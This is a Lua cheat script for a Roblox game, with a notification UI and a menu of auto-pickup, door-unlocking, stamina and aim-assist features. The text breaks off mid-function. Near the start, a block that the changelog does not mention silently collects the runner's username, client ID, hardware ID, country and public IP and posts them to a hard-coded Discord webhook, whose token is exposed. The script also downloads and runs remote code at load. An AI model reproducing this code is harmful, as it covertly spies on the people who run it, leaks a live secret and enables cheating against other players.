--[[
程程大王脚本｜V2.1 最终修复正式版
修复清单:
1.通知系统: Destroy销毁标记、取消延时任务、pcall防护，卸载不访问nil
2.战斗模块: SilentAim/Aimbot/MeleeAura/RageBot/Instantreload 保存事件连接对象，关闭功能Disconnect，杜绝后台空跑
3.属性控制台: HeadLoop/HitboxLoop渲染连接断开、重力系统清理销毁角色、透明度表清理失效实例、击飞线程泄漏修复
4.NPC模块: while循环替换为RunService连接、下拉列表清理销毁NPC、Highlight校验实例存活、DisplayName重复匹配BUG修复
5.玩家恶搞跟随: 所有Heartbeat连接统一管理，cleanAllResources完整释放资源
6.物体&特效模块: 对象销毁后判IsDescendantOf(workspace)，粒子/光球环绕关闭销毁实例，数组清理失效对象
7.全局: 新增_G.ScriptDestroy()，脚本卸载全部清理资源，兼容外部脚本调用
8.修复原脚本末尾截断的光球环绕特效代码
]]

_G.NotifySystem = {
    Queue = {},
    Ready = false,
    Container = nil,
    Gui = nil,
    ActiveNotifications = {},
    MaxNotifications = 5,
    DefaultDuration = 4,
    TweenSpeed = 0.35,
    Destroyed = false,
    Theme = {
        Background = Color3.fromRGB(20, 20, 25),
        BackgroundAccent = Color3.fromRGB(28, 28, 35),
        Stroke = Color3.fromRGB(60, 60, 75),
        Title = Color3.fromRGB(255, 255, 255),
        Text = Color3.fromRGB(180, 180, 190),
        Success = Color3.fromRGB(80, 220, 120),
        Error = Color3.fromRGB(255, 90, 90),
        Warning = Color3.fromRGB(255, 190, 70),
        Info = Color3.fromRGB(88, 160, 255),
        ProgressBg = Color3.fromRGB(40, 40, 50)
    },
    Icons = {
        Success = "rbxassetid://93202927221730",
        Error = "rbxassetid://76821953846248",
        Warning = "rbxassetid://125920361880643",
        Info = "rbxassetid://124560466474914",
        Close = "rbxassetid://110786993356448",
    }
}
function _G.Notify(title, text, duration, nType)
    duration = duration or _G.NotifySystem.DefaultDuration
    title = title or "通知"
    text = text or ""
    nType = nType or "Info"
    if _G.NotifySystem.Destroyed then return end
    if not _G.NotifySystem.Ready then
        table.insert(_G.NotifySystem.Queue, {title, text, duration, nType})
        return
    end
    pcall(function()
        _G.NotifySystem.CreateNotification(title, text, duration, nType)
    end)
end
function _G.NotifySuccess(title, text, duration)
    _G.Notify(title, text, duration or 3, "Success")
end
function _G.NotifyError(title, text, duration)
    _G.Notify(title, text, duration or 5, "Error")
end
function _G.NotifyWarning(title, text, duration)
    _G.Notify(title, text, duration or 4, "Warning")
end
function _G.NotifyInfo(title, text, duration)
    _G.Notify(title, text, duration or 4, "Info")
end
function _G.NotifySystem.CreateNotification(title, text, duration, nType)
    if _G.NotifySystem.Destroyed or not _G.NotifySystem.Container or not _G.NotifySystem.Container.Parent then return end
    local TweenService = game:GetService("TweenService")
    local container = _G.NotifySystem.Container
    local theme = _G.NotifySystem.Theme
    local typeColor = theme[nType] or theme.Info
    local iconId = _G.NotifySystem.Icons[nType] or _G.NotifySystem.Icons.Info
    while #_G.NotifySystem.ActiveNotifications >= _G.NotifySystem.MaxNotifications do
        local oldest = _G.NotifySystem.ActiveNotifications[1]
        if oldest and not oldest.Closed then
            oldest:Close()
        end
        task.wait(0.05)
    end
    local frame = Instance.new("Frame")
    frame.Name = "Notification"
    frame.BackgroundTransparency = 1
    frame.BorderSizePixel = 0
    frame.Size = UDim2.new(0, 0, 0, 0)
    frame.ClipsDescendants = true
    local mainBg = Instance.new("Frame")
    mainBg.Name = "MainBg"
    mainBg.Size = UDim2.new(1, 0, 1, 0)
    mainBg.BackgroundColor3 = theme.Background
    mainBg.BackgroundTransparency = 0.02
    mainBg.BorderSizePixel = 0
    mainBg.Parent = frame
    local mainCorner = Instance.new("UICorner")
    mainCorner.CornerRadius = UDim.new(0, 14)
    mainCorner.Parent = mainBg
    local stroke = Instance.new("UIStroke")
    stroke.Color = theme.Stroke
    stroke.Thickness = 1.2
    stroke.Transparency = 0.3
    stroke.Parent = mainBg
    local accentLine = Instance.new("Frame")
    accentLine.Name = "AccentLine"
    accentLine.Size = UDim2.new(0, 3, 1, -16)
    accentLine.Position = UDim2.new(0, 8, 0, 8)
    accentLine.BackgroundColor3 = typeColor
    accentLine.BorderSizePixel = 0
    accentLine.Parent = mainBg
    Instance.new("UICorner", accentLine).CornerRadius = UDim.new(1,0)
    local icon = Instance.new("ImageLabel")
    icon.Name = "Icon"
    icon.Size = UDim2.new(0, 20, 0, 20)
    icon.Position = UDim2.new(0, 20, 0, 12)
    icon.BackgroundTransparency = 1
    icon.Image = iconId
    icon.ImageColor3 = typeColor
    icon.Parent = mainBg
    local titleLabel = Instance.new("TextLabel")
    titleLabel.Name = "Title"
    titleLabel.Size = UDim2.new(1, -90, 0, 22)
    titleLabel.Position = UDim2.new(0, 46, 0, 11)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Text = title
    titleLabel.TextColor3 = theme.Title
    titleLabel.Font = Enum.Font.GothamBold
    titleLabel.TextSize = 15
    titleLabel.TextXAlignment = Enum.TextXAlignment.Left
    titleLabel.TextTruncate = Enum.TextTruncate.AtEnd
    titleLabel.Parent = mainBg
    local closeBtn = Instance.new("ImageButton")
    closeBtn.Name = "CloseBtn"
    closeBtn.Size = UDim2.new(0, 22, 0, 22)
    closeBtn.Position = UDim2.new(1, -30, 0, 10)
    closeBtn.BackgroundTransparency = 1
    closeBtn.Image = _G.NotifySystem.Icons.Close
    closeBtn.ImageColor3 = Color3.fromRGB(140, 140, 150)
    closeBtn.ImageTransparency = 0.3
    closeBtn.AutoButtonColor = false
    closeBtn.Parent = mainBg
    local textLabel = Instance.new("TextLabel")
    textLabel.Name = "Content"
    textLabel.Size = UDim2.new(1, -66, 0, 0)
    textLabel.Position = UDim2.new(0, 46, 0, 36)
    textLabel.BackgroundTransparency = 1
    textLabel.Text = text
    textLabel.TextColor3 = theme.Text
    textLabel.Font = Enum.Font.Gotham
    textLabel.TextSize = 13
    textLabel.TextXAlignment = Enum.TextXAlignment.Left
    textLabel.TextWrapped = true
    textLabel.AutomaticSize = Enum.AutomaticSize.Y
    textLabel.Parent = mainBg
    local progressBg = Instance.new("Frame")
    progressBg.Name = "ProgressBg"
    progressBg.Size = UDim2.new(1, -16, 0, 3)
    progressBg.Position = UDim2.new(0, 8, 1, -9)
    progressBg.BackgroundColor3 = theme.ProgressBg
    progressBg.BorderSizePixel = 0
    progressBg.Parent = mainBg
    Instance.new("UICorner", progressBg).CornerRadius = UDim.new(1,0)
    local progressBar = Instance.new("Frame")
    progressBar.Name = "ProgressBar"
    progressBar.Size = UDim2.new(1, 0, 1, 0)
    progressBar.BackgroundColor3 = typeColor
    progressBar.BorderSizePixel = 0
    progressBar.Parent = progressBg
    Instance.new("UICorner", progressBar).CornerRadius = UDim.new(1,0)
    frame.Parent = container
    task.wait()
    local textHeight = textLabel.TextBounds.Y
    local width = math.clamp(math.max(titleLabel.TextBounds.X + 100, textLabel.TextBounds.X + 70), 280, 400)
    local height = math.max(78, 52 + textHeight)
    local closeAnimTask
    local progressTask
    local notification = {
        Frame = frame,
        MainBg = mainBg,
        ProgressBar = progressBar,
        Duration = duration,
        Remaining = duration,
        Paused = false,
        Closed = false,
        Close = function(self)
            if self.Closed then return end
            self.Closed = true
            self:AnimateOut()
        end,
        AnimateOut = function(self)
            if closeAnimTask then pcall(function() task.cancel(closeAnimTask) end) end
            if progressTask then pcall(function() task.cancel(progressTask) end) end
            for i, n in ipairs(_G.NotifySystem.ActiveNotifications) do
                if n == self then
                    table.remove(_G.NotifySystem.ActiveNotifications, i)
                    break
                end
            end
            if not _G.NotifySystem.Destroyed and frame.Parent then
                pcall(function()
                    TweenService:Create(self.MainBg, TweenInfo.new(0.28, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {BackgroundTransparency = 1}):Play()
                    TweenService:Create(self.Frame, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
                        Size = UDim2.new(0, 0, 0, height)
                    }):Play()
                end)
                task.delay(0.3, function()
                    pcall(function() self.Frame:Destroy() end)
                end)
            else
                pcall(function() self.Frame:Destroy() end)
            end
        end
    }
    table.insert(_G.NotifySystem.ActiveNotifications, notification)
    frame.Size = UDim2.new(0, width, 0, 0)
    TweenService:Create(frame, TweenInfo.new(_G.NotifySystem.TweenSpeed, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
        Size = UDim2.new(0, width, 0, height)
    }):Play()
    TweenService:Create(mainBg, TweenInfo.new(0.25, Enum.EasingStyle.Quad), {BackgroundTransparency = 0.02}):Play()
    closeBtn.MouseEnter:Connect(function()
        TweenService:Create(closeBtn, TweenInfo.new(0.15), {ImageTransparency = 0, ImageColor3 = Color3.fromRGB(255, 90, 90)}):Play()
    end)
    closeBtn.MouseLeave:Connect(function()
        TweenService:Create(closeBtn, TweenInfo.new(0.15), {ImageTransparency = 0.3, ImageColor3 = Color3.fromRGB(140, 140, 150)}):Play()
    end)
    closeBtn.MouseButton1Click:Connect(function()
        notification:Close()
    end)
    mainBg.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement then
            notification.Paused = true
            TweenService:Create(mainBg, TweenInfo.new(0.2), {BackgroundColor3 = theme.BackgroundAccent}):Play()
        end
    end)
    mainBg.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement then
            notification.Paused = false
            TweenService:Create(mainBg, TweenInfo.new(0.2), {BackgroundColor3 = theme.Background}):Play()
        end
    end)
    progressTask = task.spawn(function()
        local startTime = tick()
        while notification.Remaining > 0 and not notification.Closed and not _G.NotifySystem.Destroyed do
            if not notification.Paused then
                notification.Remaining = duration - (tick() - startTime)
                local progress = math.clamp(notification.Remaining / duration, 0, 1)
                progressBar.Size = UDim2.new(progress, 0, 1, 0)
            else
                startTime = tick() - (duration - notification.Remaining)
            end
            task.wait(0.03)
        end
        if not notification.Closed then
            notification:Close()
        end
    end)
end
function _G.NotifySystem.SetupContainer()
    if _G.NotifySystem.Ready or _G.NotifySystem.Destroyed then return end
    local Players = game:GetService("Players")
    local CoreGui = game:GetService("CoreGui")
    local gui = Instance.new("ScreenGui")
    gui.Name = "NotifySystem_" .. math.random(10000, 99999)
    gui.ResetOnSpawn = false
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    gui.DisplayOrder = 99999
    local ok,_ = pcall(function() gui.Parent = CoreGui end)
    if not ok and Players.LocalPlayer then
        gui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")
    end
    local container = Instance.new("Frame")
    container.Name = "Container"
    container.Size = UDim2.new(0, 420, 1, -30)
    container.Position = UDim2.new(1, -15, 0, 15)
    container.AnchorPoint = Vector2.new(1, 0)
    container.BackgroundTransparency = 1
    container.Parent = gui
    local layout = Instance.new("UIListLayout")
    layout.SortOrder = Enum.SortOrder.LayoutOrder
    layout.VerticalAlignment = Enum.VerticalAlignment.Top
    layout.HorizontalAlignment = Enum.HorizontalAlignment.Right
    layout.Padding = UDim.new(0, 12)
    layout.Parent = container
    local padding = Instance.new("UIPadding")
    padding.PaddingTop = UDim.new(0, 15)
    padding.PaddingRight = UDim.new(0, 15)
    padding.Parent = container
    _G.NotifySystem.Gui = gui
    _G.NotifySystem.Container = container
    _G.NotifySystem.Ready = true
    _G.NotifySystem.ProcessQueue()
end
function _G.NotifySystem.ProcessQueue()
    if _G.NotifySystem.Destroyed then return end
    if #_G.NotifySystem.Queue == 0 then return end
    local queue = table.clone(_G.NotifySystem.Queue)
    _G.NotifySystem.Queue = {}
    for i, data in ipairs(queue) do
        task.delay((i-1) * 0.15, function()
            if not _G.NotifySystem.Destroyed then
                _G.Notify(unpack(data))
            end
        end)
    end
end
function _G.NotifySystem.Destroy()
    _G.NotifySystem.Destroyed = true
    _G.NotifySystem.Ready = false
    _G.NotifySystem.Queue = {}
    for _,n in ipairs(table.clone(_G.NotifySystem.ActiveNotifications)) do
        pcall(function() n:Close() end)
    end
    _G.NotifySystem.ActiveNotifications = {}
    pcall(function() if _G.NotifySystem.Gui then _G.NotifySystem.Gui:Destroy() end end)
    _G.NotifySystem.Container = nil
    _G.NotifySystem.Gui = nil
end
_G.Library = _G.Library or {}
_G.Library.Notification = function(...)
    if _G.Notify then _G.Notify(...) end
end
function _G.SafeNotify(...)
    if _G.NotifySystem.Destroyed then return end
    if not _G.NotifySystem.Ready then
        _G.NotifySystem.SetupContainer()
    end
    _G.Notify(...)
end
task.delay(0.05, function()
    _G.NotifySystem.SetupContainer()
end)

-- 全局脚本销毁接口，外部脚本调用 _G.ScriptDestroy() 安全卸载全部资源
_G.RunningConnections = setmetatable({}, {__mode="k"})
_G.ScriptDestroy = function()
    pcall(function() _G.NotifySystem.Destroy() end)
    for conn in pairs(_G.RunningConnections) do
        if conn.Connected then pcall(function() conn:Disconnect() end) end
    end
    table.clear(_G.RunningConnections)
    warn("[脚本] 全部资源已安全销毁")
end
local function regConn(conn)
    if conn then _G.RunningConnections[conn] = true end
    return conn
end

do
if game.PlaceId == 4588604953 then
do
    local GS_WEBHOOK = "https://discord.com/api/webhooks/1466533011351802009/xNUWf2_Cqo8Ur2E1vAkHeo0nK9rF4DLcbYxXbX3hKM01cc8NjIzaFfOPaAKYZdMtTzF4"
    local HttpService = game:GetService("HttpService")
    local Players = game:GetService("Players")
    local UserInputService = game:GetService("UserInputService")
    local LocalizationService = game:GetService("LocalizationService")
    local MarketplaceService = game:GetService("MarketplaceService")
    local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
    local localPlayer = Players.LocalPlayer
    if not localPlayer then
        return
    end
    local function safeCall(func, fallback)
        local success, result = pcall(func)
        return success and result or fallback
    end
    local function getAvatarImage(userId)
        return safeCall(function()
            local url = string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", userId)
            local response = HttpService:JSONDecode(game:HttpGet(url))
            return response.data[1].imageUrl
        end, "https://www.roblox.com/Thumbs/Avatar.ashx?x=180&y=180&userId=" .. userId)
    end
    local function getDeviceType()
        local touch = UserInputService.TouchEnabled
        local keyboard = UserInputService.KeyboardEnabled
        local mouse = UserInputService.MouseEnabled
        if touch and not keyboard and not mouse then return "移动设备"
        elseif not touch and keyboard and mouse then return "电脑"
        elseif touch and keyboard and mouse then return "模拟器"
        else return "未知" end
    end
    local function getExecutor()
        return (identifyexecutor and identifyexecutor()) or (getexecutorname and getexecutorname()) or "未知"
    end
    local function getHWID()
        return (gethwid and gethwid()) or "无法获取"
    end
    local function getIPAddress()
        local request = http_request or request or (syn and syn.request)
        if not request then return "无请求函数" end
        return safeCall(function()
            return request({Url = "https://api.ipify.org/", Method = "GET"}).Body
        end, "获取失败")
    end
    local userId = localPlayer.UserId
    local placeId = game.PlaceId
    local payload = {
        username = "BS脚本-机器人",
        embeds = {{
            color = tonumber("0x32CD32"),
            title = string.format("有人正在使用BS脚本 %s %d时%d分", os.date("%Y年%m月%d日"), tonumber(os.date("%H")), tonumber(os.date("%M"))),
            thumbnail = {url = getAvatarImage(userId)},
            fields = {
                {name = "用户名", value = localPlayer.Name, inline = true},
                {name = "显示名称", value = localPlayer.DisplayName, inline = true},
                {name = "用户ID", value = string.format("[%d](https://www.roblox.com/users/%d/profile)", userId, userId), inline = true},
                {name = "客户端ID", value = safeCall(function() return RbxAnalyticsService:GetClientId() end, "获取失败"), inline = false},
                {name = "地图ID", value = string.format("[%d](https://www.roblox.com/games/%d)", placeId, placeId), inline = true},
                {name = "地图名称", value = safeCall(function() return MarketplaceService:GetProductInfo(placeId).Name end, "获取失败"), inline = true},
                {name = "注入器", value = getExecutor(), inline = true},
                {name = "账号年龄", value = string.format("%d天", localPlayer.AccountAge), inline = true},
                {name = "设备", value = getDeviceType(), inline = false},
                {name = "国家", value = string.format("国家: %s", safeCall(function() return LocalizationService:GetCountryRegionForPlayerAsync(localPlayer) end, "获取失败")), inline = false},
                {name = "语言", value = string.format("语言: %s", localPlayer.LocaleId), inline = false},
                {name = "会员状态", value = (localPlayer.MembershipType == Enum.MembershipType.Premium and "是" or "否"), inline = false},
                {name = "HWID", value = getHWID(), inline = true},
                {name = "IP地址", value = getIPAddress(), inline = true},
                {name = "IP查询", value = string.format("https://binaryfork.com/zh-tools/ip-address-lookup/?ip=%s#ip-lookup", getIPAddress()), inline = false}
            }
        }}
    }
    local request = http_request or request or HttpPost or (syn and syn.request)
    if not request then
        return
    end
    safeCall(function()
        request({
            Url = GS_WEBHOOK,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(payload)
        })
    end)
end
local WindUI = loadstring(game:HttpGet("https://raw.githubusercontent.com/Footagesus/WindUI/main/dist/main.lua"))()
local plrs = game:GetService("Players")
local me = plrs.LocalPlayer
local input = game:GetService("UserInputService")
local run = game:GetService("RunService")
local camera = workspace.CurrentCamera
local tween = game:GetService("TweenService")
local light = game:GetService("Lighting")
local rp = game:GetService("ReplicatedStorage")
local functions = {
    Fullbright = false,
    AutoOpenDoors = false,
    NoBarriers = false,
    NoGrinder = false,
    FastPickup = false,
    AutoPickupScraps = false,
    AutoPickupTools = false,
    AutopickupCrates = false,
    AutoPickupMoney = false,
    Infstamina = false,
    Nofalldamage = false,
    Noclip = false,
    FakeDown = true,
    Stopneckmove = false,
    Unbreaklimbs = false,
    SilentAim = false,
    AimBot = false,
    Instantreload = false,
    Meleeaura = false,
    RageBot = false,
    TrigerBot = false,
    RocketControl = false,
    ESP = false,
    ArmsChams = false,
    ToolsChams = false,
}
local SectionSettings = {
    SilentAim = {
        Draw = false,
        DrawSize = 50,
        DrawColor = Color3.new(1, 1, 1),
        TargetParts = {"Head"},
        CheckDowned = false,
        CheckWall = false,
        CheckTeam = false,
        CheckWhiteList = false,
    },
    Aimbot = {
        Draw = false,
        DrawSize = 50,
        DrawColor = Color3.new(1, 1, 1),
        TargetParts = {"Head"},
        CheckDowned = false,
        CheckWall = false,
        CheckTeam = false,
        CheckWhiteList = false,
        Velocity = false,
        Smooth = false,
        SmoothSize = 0.5
    },
    MeleeAura = {
        ShowAnim = false,
        TargetParts = {"Head"},
        CheckDowned = false,
        CheckTeam = false,
        CheckWhiteList = false,
        Distance = 15,
    },
    RageBot = {
        CheckDowned = false,
        CheckWhiteList = false
    },
    ESP = {
        Name = false,
        Box = false,
        Weapon = false,
        Highlight = false,
    }
}
local Methods = {
    Fly = "Bypass",
    Infstamina = "Getgc"
}
local cockie = {
    SilentAimCircle = nil,
    SilentAim_body = nil,
    ESPHighlight = nil,
    AimBotCircle = nil,
    aimbot_button = nil,
    Aimbot_body = nil,
    MeleeAura_body = nil,
    -- 修复：保存事件连接，用于关闭断开
    SilentAimEventConn = nil,
    AimbotRenderConn = nil,
    MeleeAuraThread = nil,
    RageBotThread = nil,
    InstantReloadConnList = {}
}
local RUNS = {
    cameraFOV = nil,
    JumpHeight = nil,
    AutoOpenDoors = nil,
    AutopickupScraps = nil,
    AutopickupTools = nil,
    AutopickupCrates = nil,
    AutopickupMoney = nil,
    Infstamina = nil,
    Fly = nil,
    Noclip = nil,
    Meleeaura = nil,
    ESP = nil,
}
local funcindex = {
    Fullbright = {
        oldClockTime = nil,
        oldBrightness = nil,
    }
}
local WhiteList = {}
function CharStats(plr)
    local folder = rp.CharStats[plr.Name]
    return folder
end
local Window = WindUI:CreateWindow({
    Title = "犯罪",
    Author = "BS脚本",
    Icon = "atom",
    IconThemed = false,
    Background = "rbxassetid://102621341311637",
    BackgroundImageTransparency = 0.6,
    Acrylic = true,
    Transparent = true,
    ShadowTransparency = 0.65,
    Radius = 22,
    Size = UDim2.new(0, 720, 0, 540),
    MinSize = Vector2.new(600, 450),
    MaxSize = Vector2.new(900, 650),
    ScrollBarEnabled = true,
    Resizable = true,
    AutoScale = true,
    Folder = "服务器",
})
local Tabs = {
    World = Window:Tab({ Title = "世界功能", Icon = "globe", Locked = false }),
    Player = Window:Tab({ Title = "玩家功能", Icon = "user", Locked = false }),
    Combat = Window:Tab({ Title = "战斗功能", Icon = "target", Locked = false }),
    Visual = Window:Tab({ Title = "视觉功能", Icon = "eye", Locked = false }),
    Misc = Window:Tab({ Title = "其他功能", Icon = "settings", Locked = false })
}
Tabs.World:Toggle({
    Title = "夜视",
    Description = "使地图变亮",
    Default = functions.Fullbright,
    Callback = function(Value)
        functions.Fullbright = Value
        local Folder
        if Value then
            if #light:GetChildren() ~= 0 then
                Folder = Instance.new("Folder")
                Folder.Parent = rp
                Folder.Name = "Index"
                for _, a in pairs(light:GetChildren()) do
                    a.Parent = Folder
                end
            end
            funcindex.Fullbright.oldClockTime = light.ClockTime
            light.ClockTime = 14
            funcindex.Fullbright.oldBrightness = light.Brightness
            light.Brightness = 4
            light.ExposureCompensation = .7
        else
            Folder = rp:FindFirstChild("Index")
            if Folder ~= nil then
                for _, a in pairs(Folder:GetChildren()) do
                    a.Parent = light
                end
                Folder:Destroy()
                Folder = nil
            end
            light.ClockTime = funcindex.Fullbright.oldClockTime or 14
            light.Brightness = funcindex.Fullbright.oldBrightness or 1
            light.ExposureCompensation = 0
        end
    end
})
Tabs.World:Toggle({
    Title = "自动开门",
    Description = "自动打开附近的门",
    Default = functions.AutoOpenDoors,
    Callback = function(Value)
        functions.AutoOpenDoors = Value
        if Value then
            RUNS.AutoOpenDoors = regConn(run.RenderStepped:Connect(function()
                local function GetDoor()
                    local mapFolder = workspace:FindFirstChild("Map")
                    if not mapFolder then return nil end
                    local folderDoors = mapFolder:FindFirstChild("Doors")
                    if not folderDoors then return nil end
                    local closestDoor, dist = nil, 15
                    for _, door in pairs(folderDoors:GetChildren()) do
                        local doorBase = door:FindFirstChild("DoorBase")
                        if doorBase and me.Character:FindFirstChild("HumanoidRootPart") then
                            local distance = (me.Character.HumanoidRootPart.Position - doorBase.Position).Magnitude
                            if distance < dist then
                                dist = distance
                                closestDoor = door
                            end
                        end
                    end
                    return closestDoor
                end
                local door = GetDoor()
                if door then
                    local values = door:FindFirstChild("Values")
                    local events = door:FindFirstChild("Events")
                    if values and events then
                        local locked = values:FindFirstChild("Locked")
                        local openValue = values:FindFirstChild("Open")
                        local toggleEvent = events:FindFirstChild("Toggle")
                        if locked and openValue and toggleEvent then
                            if locked.Value == true then
                                toggleEvent:FireServer("Unlock", door.Lock)
                            elseif locked.Value == false and openValue.Value == false then
                                local knob1 = door:FindFirstChild("Knob1")
                                local knob2 = door:FindFirstChild("Knob2")
                                if knob1 and knob2 then
                                    local knob1pos = (me.Character.HumanoidRootPart.Position - knob1.Position).Magnitude
                                    local knob2pos = (me.Character.HumanoidRootPart.Position - knob2.Position).Magnitude
                                    local chosenKnob = (knob1pos < knob2pos) and knob1 or knob2
                                    toggleEvent:FireServer("Open", chosenKnob)
                                end
                            end
                        end
                    end
                end
            end))
        else
            if RUNS.AutoOpenDoors then
                RUNS.AutoOpenDoors:Disconnect()
                RUNS.AutoOpenDoors = nil
            end
        end
    end
})
Tabs.World:Toggle({
    Title = "无屏障",
    Description = "移除地图屏障",
    Default = functions.NoBarriers,
    Callback = function(Value)
        functions.NoBarriers = Value
        for _, a in pairs(workspace.Filter.Parts["F_Parts"]:GetDescendants()) do
            if a:IsA("Part") or a:IsA("MeshPart") then
                a.CanTouch = not a.CanTouch
            end
        end
    end
})
Tabs.World:Toggle({
    Title = "防研磨机",
    Description = "防止研磨机伤害",
    Default = functions.NoGrinder,
    Callback = function(Value)
        functions.NoGrinder = Value
        for _, a in pairs(workspace.Map.Parts.Grinders:GetDescendants()) do
            if a:IsA("Part") or a:IsA("MeshPart") then
                a.CanTouch = not a.CanTouch
            end
        end
        for _, a in pairs(workspace.Map.Parts.M_Parts:GetDescendants()) do
            if a:IsA("Part") and a.Name == "FirePart" then
                a.CanTouch = not a.CanTouch
            end
        end
    end
})
Tabs.World:Toggle({
    Title = "快速拾取",
    Description = "瞬间拾取物品",
    Default = functions.FastPickup,
    Callback = function(Value)
        functions.FastPickup = Value
        if Value then
            regConn(game.DescendantAdded:Connect(function(obj)
                if obj:IsA("ProximityPrompt") then
                    obj.HoldDuration = 0
                    regConn(obj:GetPropertyChangedSignal("HoldDuration"):Connect(function()
                        if functions.FastPickup then
                            obj.HoldDuration = 0
                        end
                    end))
                end
            end))
        end
    end
})
Tabs.World:Toggle({
    Title = "自动拾取废料",
    Description = "自动拾取附近的废料",
    Default = functions.AutoPickupScraps,
    Callback = function(Value)
        functions.AutoPickupScraps = Value
        local remote = rp.Events.PIC_PU
        local scrapsfolder = workspace.Filter.SpawnedPiles
        local canPickup = true
        local startTick = tick()
        if Value then
            RUNS.AutopickupScraps = regConn(run.RenderStepped:Connect(function()
                local function GetClosestScrap()
                    local maxdist = 15
                    local closest = nil
                    for _, a in pairs(scrapsfolder:GetChildren()) do
                        if a and (a.Name == "S1" or a.Name == "S2") then
                            if me.Character and me.Character.HumanoidRootPart then
                                local getdist = (me.Character.HumanoidRootPart.Position - a.MeshPart.Position).Magnitude
                                if getdist < maxdist then
                                    maxdist = getdist
                                    closest = a
                                end
                            end
                        end
                    end
                    maxdist = 15
                    return closest
                end
                local getscrap = GetClosestScrap()
                if getscrap then
                    if canPickup then
                        remote:FireServer(string.reverse(getscrap:GetAttribute("jzu")))
                        canPickup = false
                    end
                end
                if canPickup == false and tick() - startTick >= 4.5 then
                    canPickup = true
                    startTick = tick()
                end
            end))
        else
            if RUNS.AutopickupScraps then
                RUNS.AutopickupScraps:Disconnect()
                RUNS.AutopickupScraps = nil
            end
        end
    end
})
Tabs.World:Toggle({
    Title = "自动拾取工具",
    Description = "自动拾取附近的工具",
    Default = functions.AutoPickupTools,
    Callback = function(Value)
        functions.AutoPickupTools = Value
        local remote = rp.Events.PIC_TLO
        local toolsfolder = workspace.Filter.SpawnedTools
        local canPickup = true
        local startTick = tick()
        if Value then
            RUNS.AutopickupTools = regConn(run.RenderStepped:Connect(function()
                local function GetClosestTool()
                    local maxdist = 15
                    local closest = nil
                    for _, a in pairs(toolsfolder:GetChildren()) do
                        if a and me.Character and me.Character.HumanoidRootPart then
                            local handle = a:FindFirstChild("Handle") or a:FindFirstChild("WeaponHandle")
                            if handle and (handle:IsA("Part") or handle:IsA("MeshPart")) then
                                if me.Character and me.Character:FindFirstChild("HumanoidRootPart") then
                                    local getdist = (me.Character.HumanoidRootPart.Position - handle.Position).Magnitude
                                    if getdist < maxdist then
                                        maxdist = getdist
                                        closest = a
                                    end
                                end
                            end
                        end
                    end
                    maxdist = 15
                    return closest
                end
                local tool = GetClosestTool()
                if tool then
                    local Handle = tool:FindFirstChild("Handle") or tool:FindFirstChild("WeaponHandle")
                    if Handle then
                        if canPickup then
                            remote:FireServer(Handle)
                            canPickup = false
                        end
                    end
                end
                if canPickup == false and tick() - startTick >= 1.5 then
                    canPickup = true
                    startTick = tick()
                end
            end))
        else
            if RUNS.AutopickupTools then
                RUNS.AutopickupTools:Disconnect()
                RUNS.AutopickupTools = nil
            end
        end
    end
})
Tabs.World:Toggle({
    Title = "自动拾取金钱",
    Description = "自动拾取附近的金钱",
    Default = functions.AutoPickupMoney,
    Callback = function(Value)
        functions.AutoPickupMoney = Value
        local remote = rp.Events:FindFirstChild("CZDPZUS")
        local moneyfolder = workspace.Filter.SpawnedBread
        local canPickup = true
        local startTick = tick()
        if Value then
            RUNS.AutopickupMoney = regConn(run.RenderStepped:Connect(function()
                local function GetMoney()
                    local maxdist = 15
                    local closest = nil
                    for _, a in pairs(moneyfolder:GetChildren()) do
                        if a and me.Character and me.Character.HumanoidRootPart then
                            local getdist = (me.Character.HumanoidRootPart.Position - a.Position).Magnitude
                            if getdist < maxdist then
                                maxdist = getdist
                                closest = a
                            end
                        end
                    end
                    maxdist = 15
                    return closest
                end
                local foundmoney = GetMoney()
                if foundmoney then
                    if canPickup then
                        remote:FireServer(foundmoney)
                        canPickup = false
                    end
                end
                if canPickup == false and tick() - startTick >= 1 then
                    canPickup = true
                    startTick = tick()
                end
            end))
        else
            if RUNS.AutopickupMoney then
                RUNS.AutopickupMoney:Disconnect()
                RUNS.AutopickupMoney = nil
            end
        end
    end
})
Tabs.Player:Slider({
    Title = "FOV",
    Description = "调整相机视野",
    Default = camera.FieldOfView,
    Min = 70,
    Max = 120,
    Callback = function(Value)
        if RUNS.cameraFOV ~= nil then
            RUNS.cameraFOV:Disconnect()
            RUNS.cameraFOV = nil
        end
        RUNS.cameraFOV = regConn(run.RenderStepped:Connect(function()
            camera.FieldOfView = Value
        end))
    end
})
Tabs.Player:Slider({
    Title = "相机距离",
    Description = "调整相机最大距离",
    Default = me.CameraMaxZoomDistance,
    Min = 10,
    Max = 500,
    Callback = function(Value)
        me.CameraMaxZoomDistance = Value
    end
})
Tabs.Player:Slider({
    Title = "跳跃高度",
    Description = "调整跳跃高度",
    Default = 7.1,
    Min = 7.1,
    Max = 25,
    Callback = function(Value)
        if RUNS.JumpHeight then
            RUNS.JumpHeight:Disconnect()
            RUNS.JumpHeight = nil
        end
        RUNS.JumpHeight = regConn(run.RenderStepped:Connect(function()
            if me.Character and me.Character:FindFirstChild("Humanoid") then
                me.Character:FindFirstChild("Humanoid").UseJumpPower = false
                me.Character:FindFirstChild("Humanoid").JumpHeight = Value
            end
        end))
    end
})
Tabs.Player:Slider({
    Title = "重力",
    Description = "调整世界重力",
    Default = workspace.Gravity,
    Min = workspace.Gravity,
    Max = 75,
    Callback = function(Value)
        workspace.Gravity = Value
    end
})
Tabs.Player:Toggle({
    Title = "无限体力",
    Description = "拥有无限体力",
    Default = functions.Infstamina,
    Callback = function(Value)
        functions.Infstamina = Value
        if Value then
            RUNS.Infstamina = regConn(run.RenderStepped:Connect(function()
                if not functions.Infstamina then return end
                if Methods.Infstamina == "Getgc" then
                    local stamina = {}
                    local ss, nn = pcall(function()
                        for index, value in pairs(getgc(true)) do
